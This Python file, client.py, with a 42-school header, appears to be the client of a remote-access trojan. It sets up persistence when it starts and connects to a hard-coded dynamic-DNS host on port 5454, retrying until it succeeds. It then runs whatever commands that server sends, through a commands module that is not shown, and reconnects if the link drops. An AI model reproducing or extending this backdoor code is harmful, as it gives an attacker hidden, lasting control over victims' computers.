# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    client.py                                          :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: TheRed <TheRed@students.42.fr>             +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/07/21 12:18:17 by TheRed            #+#    #+#              #
#    Updated: 2024/07/21 12:18:17 by TheRed           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from time import sleep
import socket
import struct
import json


from commands import Command

class Client:
	def __init__(self) -> None:
		self.socket:	socket.socket = None
		self.commands:	Command = Command(self)

		self.commands.persistance([1])
		self.initSocket()

	def connectSocket(self) -> None:
		try:
			print("trying..")

			self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.socket.connect(('singularityred.ddns.net', 5454))
			
			print("connected")
		
		except:
			sleep(5)
			self.connectSocket()

	def initSocket(self) -> None:
		self.connectSocket()

		while True:
			data = self.recv()
			if not data:
				break

			data = json.loads(data)
			print("received:", data)	

			data_type = data[0]
			if (data_type == "command"):
				command = data[1][0]
				command_args = data[1][1:]

				self.commands.command(command, command_args)

		self.initSocket()

	def recv(self) -> str:
		try:
			return self.socket.recv(1024).decode()
		except:
			return ""
		
	def send(self, data: str, encoding=True) -> bool:
		try:
			if (encoding):
				data = data.encode()
			message = struct.pack(">I", len(data)) + data
			self.socket.sendall(message)
		except:
			return False
		return True
		
	def close(self) -> None:
		self.socket.close()